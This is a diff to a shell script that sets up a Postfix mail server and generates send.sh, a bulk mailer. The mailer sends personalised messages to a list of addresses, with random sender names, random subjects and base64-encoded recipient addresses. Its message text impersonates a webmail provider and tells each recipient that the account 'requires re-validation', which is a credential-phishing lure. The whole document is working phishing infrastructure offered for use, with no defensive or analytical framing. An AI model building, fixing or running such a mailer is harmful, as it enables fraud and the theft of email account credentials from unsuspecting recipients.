@@ -49,7 +49,7 @@ sudo tee /etc/postfix/main.cf > /dev/null <<EOL
 # Postfix main configuration file
 myhostname = bulkmail.$domain
 mydomain = $domain
-myorigin = $mydomain
+myorigin = $domain
 
 inet_protocols = ipv4
 smtp_helo_name = bulkmail.$domain
@@ -152,89 +152,89 @@ EMAIL_LIST="list.txt"
 HTML_TEMPLATE="email.html"
 SUBJECT_FILE="subject.txt"
 NAME_FILE="name.txt"
-LOG_FILE="send_log_$(date +%Y%m%d).txt"
+LOG_FILE="send_log_\$(date +%Y%m%d).txt"
 
 # Initialize counters
-TOTAL=$(wc -l < "$EMAIL_LIST")
+TOTAL=\$(wc -l < "\$EMAIL_LIST")
 SUCCESS=0
 FAILED=0
 
 # Verify required files exist
-for file in "$EMAIL_LIST" "$HTML_TEMPLATE" "$SUBJECT_FILE" "$NAME_FILE"; do
-    if [ ! -f "$file" ]; then
-        echo "Error: Missing $file" | tee -a "$LOG_FILE"
+for file in "\$EMAIL_LIST" "\$HTML_TEMPLATE" "\$SUBJECT_FILE" "\$NAME_FILE"; do
+    if [ ! -f "\$file" ]; then
+        echo "Error: Missing \$file" | tee -a "\$LOG_FILE"
         exit 1
     fi
 done
 
 # Load all subjects and names into arrays
-mapfile -t SUBJECTS < "$SUBJECT_FILE"
-mapfile -t NAMES < "$NAME_FILE"
+mapfile -t SUBJECTS < "\$SUBJECT_FILE"
+mapfile -t NAMES < "\$NAME_FILE"
 
 # Random name generator (from name.txt)
 get_random_name() {
-    echo "${NAMES[$((RANDOM % ${#NAMES[@]}))]}"
+    echo "\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"
 }
 
 # Random number generator (4-6 digits)
 get_random_number() {
-    echo $((RANDOM % 9000 + 1000))
+    echo \$((RANDOM % 9000 + 1000))
 }
 
 # Process each email
 while IFS= read -r email; do
     # Clean and parse email address
-    CLEAN_EMAIL=$(echo "$email" | tr -d '\r\n')
-    EMAIL_USER=$(echo "$CLEAN_EMAIL" | cut -d@ -f1)
-    EMAIL_DOMAIN=$(echo "$CLEAN_EMAIL" | cut -d@ -f2)
-    CURRENT_DATE=$(date +%Y-%m-%d)
-    BASE64_EMAIL=$(echo -n "$CLEAN_EMAIL" | base64)
+    CLEAN_EMAIL=\$(echo "\$email" | tr -d '\\r\\n')
+    EMAIL_USER=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f1)
+    EMAIL_DOMAIN=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f2)
+    CURRENT_DATE=\$(date +%Y-%m-%d)
+    BASE64_EMAIL=\$(echo -n "\$CLEAN_EMAIL" | base64)
 
     # Generate random elements
-    RANDOM_NAME=$(get_random_name)
-    RANDOM_NUMBER=$(get_random_number)
-    SELECTED_SENDER_NAME="${NAMES[$((RANDOM % ${#NAMES[@]}))]}"
+    RANDOM_NAME=\$(get_random_name)
+    RANDOM_NUMBER=\$(get_random_number)
+    SELECTED_SENDER_NAME="\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"
     
     # Select subject and REPLACE ITS VARIABLES
-    SELECTED_SUBJECT="${SUBJECTS[$((RANDOM % ${#SUBJECTS[@]}))]}"
-    SELECTED_SUBJECT=$(echo "$SELECTED_SUBJECT" | sed \
-        -e "s|{date}|$CURRENT_DATE|g" \
-        -e "s|{recipient-email}|$CLEAN_EMAIL|g" \
-        -e "s|{recipient-user}|$EMAIL_USER|g" \
-        -e "s|{recipient-domain}|$EMAIL_DOMAIN|g" \
-        -e "s|{name}|$RANDOM_NAME|g" \
-        -e "s|{random-name}|$(get_random_name)|g" \
-        -e "s|{random-number}|$RANDOM_NUMBER|g")
+    SELECTED_SUBJECT="\${SUBJECTS[\$((RANDOM % \${#SUBJECTS[@]}))]}"
+    SELECTED_SUBJECT=\$(echo "\$SELECTED_SUBJECT" | sed \
+        -e "s|{date}|\$CURRENT_DATE|g" \
+        -e "s|{recipient-email}|\$CLEAN_EMAIL|g" \
+        -e "s|{recipient-user}|\$EMAIL_USER|g" \
+        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g" \
+        -e "s|{name}|\$RANDOM_NAME|g" \
+        -e "s|{random-name}|\$(get_random_name)|g" \
+        -e "s|{random-number}|\$RANDOM_NUMBER|g")
 
-    echo "Processing: $CLEAN_EMAIL"
+    echo "Processing: \$CLEAN_EMAIL"
     
     # Generate unique Message-ID
-    MESSAGE_ID="<$(date +%s%N).$(openssl rand -hex 8)@$domain>"
+    MESSAGE_ID="<\$(date +%s%N).\$(openssl rand -hex 8)@$domain>"
     
     # Create temporary HTML file with replaced variables
-    TEMP_HTML=$(mktemp)
+    TEMP_HTML=\$(mktemp)
     sed \
-        -e "s|{date}|$CURRENT_DATE|g" \
-        -e "s|{recipient-email}|$CLEAN_EMAIL|g" \
-        -e "s|{recipient-user}|$EMAIL_USER|g" \
-        -e "s|{recipient-domain}|$EMAIL_DOMAIN|g" \
-        -e "s|{name}|$RANDOM_NAME|g" \
-        -e "s|{random-name}|$(get_random_name)|g" \
-        -e "s|{random-number}|$RANDOM_NUMBER|g" \
+        -e "s|{date}|\$CURRENT_DATE|g" \
+        -e "s|{recipient-email}|\$CLEAN_EMAIL|g" \
+        -e "s|{recipient-user}|\$EMAIL_USER|g" \
+        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g" \
+        -e "s|{name}|\$RANDOM_NAME|g" \
+        -e "s|{random-name}|\$(get_random_name)|g" \
+        -e "s|{random-number}|\$RANDOM_NUMBER|g" \
         -e "s|{sender-email}|$username@$domain|g" \
-        -e "s|{sender-name}|$SELECTED_SENDER_NAME|g" \
-        -e "s|{base64-encryptedrecipents-email}|$BASE64_EMAIL|g" \
-        "$HTML_TEMPLATE" > "$TEMP_HTML"
+        -e "s|{sender-name}|\$SELECTED_SENDER_NAME|g" \
+        -e "s|{base64-encryptedrecipents-email}|\$BASE64_EMAIL|g" \
+        "\$HTML_TEMPLATE" > "\$TEMP_HTML"
     
     # Send with dynamic content
-# Create text version
-TEMP_TEXT=$(mktemp)
-cat <<EOF > "$TEMP_TEXT"
+    # Create text version
+    TEMP_TEXT=\$(mktemp)
+    cat <<EOF > "\$TEMP_TEXT"
 Webmail - Mail. Host. Online
 
 Email Account Status Changed
 
-Hi $EMAIL_USER,
+Hi \$EMAIL_USER,
 
 We are reaching out to inform you that your webmail account requires re-validation before June 10, 2025 to ensure continued access.
 
@@ -248,51 +248,52 @@ EOF
 # Send with both HTML and text
 cat <<EOF | /usr/sbin/sendmail -t -oi
 Return-Path: <$username@$domain>
-From: "$SELECTED_SENDER_NAME" <$username@$domain>
-To: <$CLEAN_EMAIL>
-Subject: $SELECTED_SUBJECT
+From: "\$SELECTED_SENDER_NAME" <$username@$domain>
+To: <\$CLEAN_EMAIL>
+Subject: \$SELECTED_SUBJECT
 MIME-Version: 1.0
 Content-Type: multipart/alternative; boundary="MULTIPART_BOUNDARY"
 
 --MULTIPART_BOUNDARY
 Content-Type: text/plain; charset=UTF-8
 
-$(cat "$TEMP_TEXT")
+\$(cat "\$TEMP_TEXT")
 
 --MULTIPART_BOUNDARY
 Content-Type: text/html; charset=UTF-8
 
-$(cat "$TEMP_HTML")
+\$(cat "\$TEMP_HTML")
 
 --MULTIPART_BOUNDARY--
 EOF
 
-rm "$TEMP_TEXT"
+    rm "\$TEMP_TEXT"
 
     # Check exit status and clean up
-    if [ $? -eq 0 ]; then
-        echo "$(date) - SUCCESS: $CLEAN_EMAIL" >> "$LOG_FILE"
+    if [ \$? -eq 0 ]; then
+        echo "\$(date) - SUCCESS: \$CLEAN_EMAIL" >> "\$LOG_FILE"
         ((SUCCESS++))
     else
-        echo "$(date) - FAILED: $CLEAN_EMAIL" >> "$LOG_FILE"
+        echo "\$(date) - FAILED: \$CLEAN_EMAIL" >> "\$LOG_FILE"
         ((FAILED++))
     fi
     
-    rm "$TEMP_HTML"
+    rm "\$TEMP_HTML"
     
     # Dynamic delay (0.5-3 seconds)
-    sleep $(awk -v min=0.3 -v max=0.8 'BEGIN{srand(); print min+rand()*(max-min)}')
+    sleep \$(awk -v min=0.3 -v max=0.8 'BEGIN{srand(); print min+rand()*(max-min)}')
     
     # Progress indicator
-    echo "[$SUCCESS/$TOTAL] Sent to $CLEAN_EMAIL"
+    echo "[$SUCCESS/$TOTAL] Sent to \$CLEAN_EMAIL"
     
-done < "$EMAIL_LIST"
+done < "\$EMAIL_LIST"
 
 # Final report
-echo "Completed at $(date)" >> "$LOG_FILE"
-echo "Total: $TOTAL | Success: $SUCCESS | Failed: $FAILED" >> "$LOG_FILE"
-echo "Full log: $LOG_FILE"
+echo "Completed at \$(date)" >> "\$LOG_FILE"
+echo "Total: \$TOTAL | Success: \$SUCCESS | Failed: \$FAILED" >> "\$LOG_FILE"
+echo "Full log: \$LOG_FILE"
 EOL
+
 
 # Make the send.sh script executable
 chmod +x send.sh
